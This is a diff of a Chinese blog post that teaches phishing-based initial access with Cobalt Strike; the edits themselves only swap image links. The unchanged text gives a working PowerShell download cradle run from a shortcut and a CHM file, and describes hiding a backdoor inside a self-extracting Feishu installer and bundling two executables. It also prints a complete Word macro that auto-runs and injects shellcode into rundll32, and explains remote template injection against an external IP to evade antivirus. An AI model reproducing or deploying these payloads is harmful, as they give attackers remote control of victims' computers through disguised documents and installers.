@@ -101,7 +101,7 @@
 <p>需要用到kali，先看一下kali的ip</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br><span class="line">#ipconfig(dos命令)</span><br></pre></td></tr></table></figure>
 
-<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-1-1024x271.png" alt="img"></p>
+<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021525054.png" alt="image-20231002152501998"></p>
 <p>ip，255.255.255.0子网掩码，192.168.137.255广播地址</p>
 <h2 id="开启CS"><a href="#开启CS" class="headerlink" title="开启CS"></a>开启CS</h2><p>先切换成root用户</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure>
@@ -112,88 +112,87 @@
 <p>打开teamserver，ip为kali的ip，yb.com是密码</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver 192.168.137.128 yb.com</span><br></pre></td></tr></table></figure>
 
-<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-2-1024x319.png" alt="img"></p>
+<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021525990.png" alt="image-20231002152520930"></p>
 <p>然后在win10打开start.bat，用户名随便输（也可以在kali打开start.sh）</p>
-<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-3-1024x336.png" alt="img"></p>
+<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021525315.png" alt="image-20231002152536268"></p>
 <p>主机就是kali的ip，端口默认，密码就是上面设置的密码</p>
 <p>设置一个监听器</p>
-<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-4-1024x770.png" alt="img"></p>
-<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-5.png" alt="img"></p>
+<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021525754.png" alt="image-20231002152551686"></p>
+<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021526202.png" alt="image-20231002152608148"></p>
 <h2 id="快捷方式"><a href="#快捷方式" class="headerlink" title="快捷方式"></a>快捷方式</h2><p>用 Cobalt Strike 生成命令</p>
-<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-6.png" alt="img"></p>
-<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-7.png" alt="img"></p>
+<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021526929.png" alt="image-20231002152620878"></p>
+<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021526635.png" alt="image-20231002152637590"></p>
 <p>得到</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.137.131:80/a&#x27;))&quot;</span><br></pre></td></tr></table></figure>
 
 <p>创建一个快捷方式，内容为上</p>
-<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-8.png" alt="img"></p>
+<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021526018.png" alt="image-20231002152648969"></p>
 <p>将生成的powershell.exe放在靶机上，然后双击打开</p>
 <p>成功获取shell</p>
-<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-9-1024x762.png" alt="img"></p>
+<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021527578.png" alt="image-20231002152703516"></p>
 <h2 id="CHM帮助文档上线"><a href="#CHM帮助文档上线" class="headerlink" title="CHM帮助文档上线"></a>CHM帮助文档上线</h2><p>新建一个文件夹，名字随意，文件夹里面新建一个 index.html 文件并填入如下代码</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;&lt;head&gt;&lt;title&gt;Mousejack replay&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">command exec</span><br><span class="line">&lt;OBJECT id=x classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;</span><br><span class="line">width=1 height=1&gt;</span><br><span class="line">&lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt;</span><br><span class="line">&lt;PARAM name=&quot;Button&quot; value=&quot;Bitmap::shortcut&quot;&gt;</span><br><span class="line">&lt;PARAM name=&quot;Item1&quot; value=&#x27;,calc.exe&#x27;&gt;</span><br><span class="line">&lt;PARAM name=&quot;Item2&quot; value=&quot;273,1,1&quot;&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;SCRIPT&gt;</span><br><span class="line">x.Click();</span><br><span class="line">&lt;/SCRIPT&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;&lt;head&gt;&lt;title&gt;Mousejack replay&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">command exec</span><br><span class="line">&lt;OBJECT id=x classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;</span><br><span class="line">width=1 height=1&gt;</span><br><span class="line">&lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt;</span><br><span class="line">&lt;PARAM name=&quot;Button&quot; value=&quot;Bitmap::shortcut&quot;&gt;</span><br><span class="line">&lt;PARAM name=&quot;Item1&quot; value=&quot;,powershell.exe, -nop -w hidden -c IEX</span><br><span class="line">((new-object net.webclient).downloadstring(&#x27;http://192.168.137.131:80/a&#x27;))&quot;&gt;</span><br><span class="line">&lt;PARAM name=&quot;Item2&quot; value=&quot;273,1,1&quot;&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;SCRIPT&gt;</span><br><span class="line">x.Click();</span><br><span class="line">&lt;/SCRIPT&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
 
 <p>EasyCHM 编译生成 CHM</p>
-<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-10.png" alt="img"></p>
-<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-11.png" alt="img"></p>
-<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-12-1024x614.png" alt="img"></p>
+<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021527441.png" alt="image-20231002152748388"></p>
+<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021528960.png" alt="image-20231002152833900"></p>
 <p>放到靶机上打开 CHM 帮助文档然后点击即可在 Cobalt Strike 上线（实战伪装的像一点 <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42131443/article/details/112719415">https://blog.csdn.net/weixin_42131443/article/details/112719415</a></p>
 <p>点击上线</p>
-<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-13-1024x642.png" alt="img"></p>
-<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-14-1024x734.png" alt="img"></p>
+<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021528719.png" alt="image-20231002152847666"></p>
+<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021529439.png" alt="image-20231002152905375"></p>
 <h2 id="压缩文件自解压上线"><a href="#压缩文件自解压上线" class="headerlink" title="压缩文件自解压上线"></a>压缩文件自解压上线</h2><p>Cobalt Strike 生成 exe 可执行程序后门</p>
-<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-15.png" alt="img"></p>
-<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-16.png" alt="img"></p>
+<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021529159.png" alt="image-20231002152924115"></p>
+<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021529262.png" alt="image-20231002152937217"></p>
 <p>把生成的 exe 后门和正常的 exe 文件自定义压缩（选中，添加到压缩文件），把两个文件选中后点击添加到压缩文件，然后点击创建自解压格式压缩文件</p>
-<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-17.png" alt="img"></p>
+<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021529737.png" alt="image-20231002152949685"></p>
 <p>点击 高级-&gt;自解压选项</p>
-<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-18.png" alt="img"></p>
+<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021530075.png" alt="image-20231002153000024"></p>
 <p>设置解压路径为 C:\Users\yb\Desktop\钓鱼</p>
-<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-19.png" alt="img"></p>
+<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021530791.png" alt="image-20231002153013744"></p>
 <p>添加解压后运行的程序</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\yb\Desktop\钓鱼\artifact.exe</span><br><span class="line">C:\Users\yb\Desktop\钓鱼\Feishu-win32_ia32-5.28.7-signed.exe</span><br></pre></td></tr></table></figure>
 
-<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-20.png" alt="img"></p>
+<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021530171.png" alt="image-20231002153056120"></p>
 <p>设置 模式-&gt; 静默模式-&gt; 全部隐藏</p>
-<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-21.png" alt="img"></p>
+<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021531995.png" alt="image-20231002153110953"></p>
 <p>设置 更新模式为解压并更新文件 和 覆盖模式为 覆盖所有文件</p>
-<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-22.png" alt="img"></p>
+<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021531042.png" alt="image-20231002153122001"></p>
 <p>最后设置压缩文件名进行压缩</p>
-<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-23.png" alt="img"></p>
+<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021531634.png" alt="image-20231002153134581"></p>
 <p>在靶机上执行压缩出来的 exe 文件，此时飞书的安装程序会正常进行，而后门程序也悄悄启动</p>
 <p>这个图标看起来有点假，改一下，工具：<code>ResourceHacker</code></p>
 <p>图片转换为ico格式：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.bitbug.net/</span><br></pre></td></tr></table></figure>
 
 <h2 id="捆绑文件上线"><a href="#捆绑文件上线" class="headerlink" title="捆绑文件上线"></a>捆绑文件上线</h2><p>用 <code>超级文件捆绑（免杀增强版）.zp.exe</code> 可以把两个 exe 程序绑定在一起，启动一个 exe 程序就会启动另一个 exe 程序</p>
-<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-24.png" alt="img"></p>
+<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021532666.png" alt="image-20231002153243623"></p>
 <p>把捆绑生成的 exe 文件放到靶机上执行，Cobalt Strike 会获取到目标 shell。</p>
-<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-25.png" alt="img"></p>
+<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021532163.png" alt="image-20231002153256116"></p>
 <h2 id="Word上线宏语言编写的后门"><a href="#Word上线宏语言编写的后门" class="headerlink" title="Word上线宏语言编写的后门"></a>Word上线宏语言编写的后门</h2><h3 id="word"><a href="#word" class="headerlink" title="word"></a>word</h3><p>Cobalt Strike 生成宏语言编写的后门</p>
-<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-26.png" alt="img"></p>
-<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-27.png" alt="img"></p>
+<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021533592.png" alt="image-20231002153307549"></p>
+<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021533752.png" alt="image-20231002153317713"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">Private Type PROCESS_INFORMATION</span><br><span class="line">    hProcess As Long</span><br><span class="line">    hThread As Long</span><br><span class="line">    dwProcessId As Long</span><br><span class="line">    dwThreadId As Long</span><br><span class="line">End Type</span><br><span class="line"></span><br><span class="line">Private Type STARTUPINFO</span><br><span class="line">    cb As Long</span><br><span class="line">    lpReserved As String</span><br><span class="line">    lpDesktop As String</span><br><span class="line">    lpTitle As String</span><br><span class="line">    dwX As Long</span><br><span class="line">    dwY As Long</span><br><span class="line">    dwXSize As Long</span><br><span class="line">    dwYSize As Long</span><br><span class="line">    dwXCountChars As Long</span><br><span class="line">    dwYCountChars As Long</span><br><span class="line">    dwFillAttribute As Long</span><br><span class="line">    dwFlags As Long</span><br><span class="line">    wShowWindow As Integer</span><br><span class="line">    cbReserved2 As Integer</span><br><span class="line">    lpReserved2 As Long</span><br><span class="line">    hStdInput As Long</span><br><span class="line">    hStdOutput As Long</span><br><span class="line">    hStdError As Long</span><br><span class="line">End Type</span><br><span class="line"></span><br><span class="line">#If VBA7 Then</span><br><span class="line">    Private Declare PtrSafe Function CreateStuff Lib &quot;kernel32&quot; Alias &quot;CreateRemoteThread&quot; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtr</span><br><span class="line">    Private Declare PtrSafe Function AllocStuff Lib &quot;kernel32&quot; Alias &quot;VirtualAllocEx&quot; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr</span><br><span class="line">    Private Declare PtrSafe Function WriteStuff Lib &quot;kernel32&quot; Alias &quot;WriteProcessMemory&quot; (ByVal hProcess As Long, ByVal lDest As LongPtr, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As LongPtr) As LongPtr</span><br><span class="line">    Private Declare PtrSafe Function RunStuff Lib &quot;kernel32&quot; Alias &quot;CreateProcessA&quot; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long</span><br><span class="line">#Else</span><br><span class="line">    Private Declare Function CreateStuff Lib &quot;kernel32&quot; Alias &quot;CreateRemoteThread&quot; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As Long</span><br><span class="line">    Private Declare Function AllocStuff Lib &quot;kernel32&quot; Alias &quot;VirtualAllocEx&quot; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long</span><br><span class="line">    Private Declare Function WriteStuff Lib &quot;kernel32&quot; Alias &quot;WriteProcessMemory&quot; (ByVal hProcess As Long, ByVal lDest As Long, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As Long) As Long</span><br><span class="line">    Private Declare Function RunStuff Lib &quot;kernel32&quot; Alias &quot;CreateProcessA&quot; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long</span><br><span class="line">#End If</span><br><span class="line"></span><br><span class="line">Sub Auto_Open()</span><br><span class="line">    Dim myByte As Long, myArray As Variant, offset As Long</span><br><span class="line">    Dim pInfo As PROCESS_INFORMATION</span><br><span class="line">    Dim sInfo As STARTUPINFO</span><br><span class="line">    Dim sNull As String</span><br><span class="line">    Dim sProc As String</span><br><span class="line"></span><br><span class="line">#If VBA7 Then</span><br><span class="line">    Dim rwxpage As LongPtr, res As LongPtr</span><br><span class="line">#Else</span><br><span class="line">    Dim rwxpage As Long, res As Long</span><br><span class="line">#End If</span><br><span class="line">    myArray = Array(-4,-24,-119,0,0,0,96,-119,-27,49,-46,100,-117,82,48,-117,82,12,-117,82,20,-117,114,40,15,-73,74,38,49,-1,49,-64,-84,60,97,124,2,44,32,-63,-49, _</span><br><span class="line">13,1,-57,-30,-16,82,87,-117,82,16,-117,66,60,1,-48,-117,64,120,-123,-64,116,74,1,-48,80,-117,72,24,-117,88,32,1,-45,-29,60,73,-117,52,-117,1, _</span><br><span class="line">-42,49,-1,49,-64,-84,-63,-49,13,1,-57,56,-32,117,-12,3,125,-8,59,125,36,117,-30,88,-117,88,36,1,-45,102,-117,12,75,-117,88,28,1,-45,-117,4, _</span><br><span class="line">-117,1,-48,-119,68,36,36,91,91,97,89,90,81,-1,-32,88,95,90,-117,18,-21,-122,93,104,110,101,116,0,104,119,105,110,105,84,104,76,119,38,7,-1, _</span><br><span class="line">-43,49,-1,87,87,87,87,87,104,58,86,121,-89,-1,-43,-23,-124,0,0,0,91,49,-55,81,81,106,3,81,81,104,80,0,0,0,83,80,104,87,-119,-97, _</span><br><span class="line">-58,-1,-43,-21,112,91,49,-46,82,104,0,2,64,-124,82,82,82,83,82,80,104,-21,85,46,59,-1,-43,-119,-58,-125,-61,80,49,-1,87,87,106,-1,83,86, _</span><br><span class="line">104,45,6,24,123,-1,-43,-123,-64,15,-124,-61,1,0,0,49,-1,-123,-10,116,4,-119,-7,-21,9,104,-86,-59,-30,93,-1,-43,-119,-63,104,69,33,94,49,-1, _</span><br><span class="line">-43,49,-1,87,106,7,81,86,80,104,-73,87,-32,11,-1,-43,-65,0,47,0,0,57,-57,116,-73,49,-1,-23,-111,1,0,0,-23,-55,1,0,0,-24,-117,-1, _</span><br><span class="line">-1,-1,47,78,98,119,53,0,17,-116,127,123,-80,105,69,14,82,-44,122,-27,-53,42,104,60,-120,-108,98,52,-62,95,-18,-112,16,111,20,3,-63,71,-7,118, _</span><br><span class="line">-3,-22,-113,-31,-125,-89,-52,25,40,-126,37,-56,35,-42,-31,-114,-111,68,-116,68,8,87,-118,-94,-88,108,38,84,9,33,50,126,64,75,-38,65,-84,-107,-125,11, _</span><br><span class="line">-27,0,85,115,101,114,45,65,103,101,110,116,58,32,77,111,122,105,108,108,97,47,52,46,48,32,40,99,111,109,112,97,116,105,98,108,101,59,32,77, _</span><br><span class="line">83,73,69,32,55,46,48,59,32,87,105,110,100,111,119,115,32,78,84,32,53,46,49,59,32,83,86,49,59,32,46,78,69,84,32,67,76,82,32,50, _</span><br><span class="line">46,48,46,53,48,55,50,55,41,13,10,0,-6,-89,42,91,59,-3,-74,-45,-22,-76,49,37,-71,-60,-58,-82,-103,-18,21,-74,78,117,-3,-116,107,114,-34,-97, _</span><br><span class="line">-10,45,42,10,-96,63,86,66,49,-94,88,-116,-29,-60,53,-85,40,-96,103,-106,10,36,-104,-4,48,35,60,-69,126,14,38,66,22,-43,82,99,-66,74,-59,32, _</span><br><span class="line">-88,3,97,-80,-22,21,26,52,0,-38,5,75,12,-64,-118,72,-97,-32,-76,9,103,34,-8,45,-78,-103,125,-63,123,5,-40,66,-122,22,-80,-81,-71,-86,-24,2, _</span><br><span class="line">27,66,76,-93,-28,126,-5,-15,51,106,19,-37,33,122,31,-9,49,-71,-93,-17,-67,112,-12,-18,53,11,-93,20,-97,-82,-17,15,-97,-57,60,74,-74,81,-106,-101, _</span><br><span class="line">-71,13,71,-39,-126,81,-88,-84,71,109,-71,-25,-28,-58,72,4,-8,-13,81,9,-95,-118,-94,29,-48,-34,34,-106,-41,-13,-111,18,24,72,-121,53,34,12,-26,-38, _</span><br><span class="line">-117,-58,100,-76,8,46,-67,41,52,-14,-102,-7,103,91,-7,-22,-86,-123,71,-116,-53,93,100,101,-57,0,104,-16,-75,-94,86,-1,-43,106,64,104,0,16,0,0, _</span><br><span class="line">104,0,0,64,0,87,104,88,-92,83,-27,-1,-43,-109,-71,0,0,0,0,1,-39,81,83,-119,-25,87,104,0,32,0,0,83,86,104,18,-106,-119,-30,-1,-43, _</span><br><span class="line">-123,-64,116,-58,-117,7,1,-61,-123,-64,117,-27,88,-61,-24,-87,-3,-1,-1,49,57,50,46,49,54,56,46,49,51,55,46,49,51,49,0,18,52,86,120)</span><br><span class="line">    If Len(Environ(&quot;ProgramW6432&quot;)) &gt; 0 Then</span><br><span class="line">        sProc = Environ(&quot;windir&quot;) &amp; &quot;\\SysWOW64\\rundll32.exe&quot;</span><br><span class="line">    Else</span><br><span class="line">        sProc = Environ(&quot;windir&quot;) &amp; &quot;\\System32\\rundll32.exe&quot;</span><br><span class="line">    End If</span><br><span class="line"></span><br><span class="line">    res = RunStuff(sNull, sProc, ByVal 0&amp;, ByVal 0&amp;, ByVal 1&amp;, ByVal 4&amp;, ByVal 0&amp;, sNull, sInfo, pInfo)</span><br><span class="line"></span><br><span class="line">    rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), &amp;H1000, &amp;H40)</span><br><span class="line">    For offset = LBound(myArray) To UBound(myArray)</span><br><span class="line">        myByte = myArray(offset)</span><br><span class="line">        res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0&amp;)</span><br><span class="line">    Next offset</span><br><span class="line">    res = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)</span><br><span class="line">End Sub</span><br><span class="line">Sub AutoOpen()</span><br><span class="line">    Auto_Open</span><br><span class="line">End Sub</span><br><span class="line">Sub Workbook_Open()</span><br><span class="line">    Auto_Open</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure>
 
 <p>新建一个 word 文档，开启开发工具（文件-&gt;选项-&gt;自定义功能区-&gt;开发工具）</p>
-<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-28-1024x820.png" alt="img"></p>
+<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021534695.png" alt="image-20231002153409633"></p>
 <p>开发工具-&gt;Visual Basic</p>
-<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-29-1024x262.png" alt="img"></p>
+<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021534159.png" alt="image-20231002153427111"></p>
 <p>把上面生成的宏语言后门粘贴进去</p>
-<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-30-1024x506.png" alt="img"></p>
+<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021534288.png" alt="image-20231002153447217"></p>
 <p>保存时点击对话框的“否”</p>
 <p>另存为Word 97-2003 文档格式，保证低版本word可以打开</p>
-<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-31-1024x683.png" alt="img"></p>
+<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021535215.png" alt="image-20231002153505159"></p>
 <p>用word打开，靶机上线</p>
-<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-32-1024x469.png" alt="img"></p>
+<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021535883.png" alt="image-20231002153516828"></p>
 <h3 id="注入远程恶意word模板"><a href="#注入远程恶意word模板" class="headerlink" title="注入远程恶意word模板"></a>注入远程恶意word模板</h3><p>可以把恶意的word文件放到自己的vps上，然后通过word可以加载网络上的word模板的功能加载vps上的word文件，达到绕过一部分杀软的检测，因为靶机上的word文件的确是人畜无害的。</p>
 <p>按前面正常的word钓鱼步骤，在另存时保存为dotm格式即启用宏的word模板</p>
-<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-33-1024x293.png" alt="img"></p>
+<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021535882.png" alt="image-20231002153530839"></p>
 <p>放到vps上，用 python3 -m http.server 8080 （python2: python -m SimpleHTTPServer 8080）开启简易web服务，确保靶机上用 <a target="_blank" rel="noopener" href="http://vpsip:8080/dy.dotm">http://vpsip:8080/dy.dotm</a> 能访问到</p>
-<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-34.png" alt="img"></p>
+<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021535953.png" alt="image-20231002153541884"></p>
 <p>打开word，加载模板创建一个word文件</p>
-<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-35-1024x616.png" alt="img"></p>
+<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021535540.png" alt="image-20231002153558479"></p>
 <p>保存为docx格式，然后把生成的word文件后缀改为zip格式然后解压得到如下目录</p>
-<p><img src="http://www.ybxyz.top/wp-content/uploads/2023/01/%E5%9B%BE%E7%89%87-36.png" alt="img"></p>
+<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021536076.png" alt="image-20231002153609039"></p>
 <p>打开 word&#x2F;_rels&#x2F;settings.xml.rels 文件，把Target字段内容改为dotm文件对应ur</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span><br><span class="line">&lt;Relationships xmlns=&quot;http://schemas.openxmlformats.org/package/2006/relationships&quot;&gt;&lt;Relationship Id=&quot;rId1&quot; Type=&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate&quot; Target=&quot;http://49.0.251.11:8080/1.dotm&quot; TargetMode=&quot;External&quot;/&gt;&lt;/Relationships&gt;</span><br></pre></td></tr></table></figure>
 
